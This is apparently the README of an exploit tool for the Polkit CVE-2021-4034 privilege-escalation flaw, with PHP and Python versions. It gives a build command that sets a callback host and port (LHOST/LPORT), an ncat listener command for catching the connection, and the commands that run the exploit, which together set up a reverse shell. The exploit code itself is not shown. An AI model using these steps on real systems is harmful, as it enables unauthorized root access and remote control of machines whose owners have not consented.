# Polkit-CVE-2021-4034-HLP
Polkit CVE-2021-4034 exploitation in High-Level Programming Language

## Build
```
make LHOST=ip.or.domain.tld LPORT=8000
```

## Usage

Open TCP port listener, example with `ncat` on loopback
```
ncat -vl 127.0.0.1 8000
```

Run exploit
```
php ${ARCH}_exploit.php
python ${ARCH}_exploit.py
```
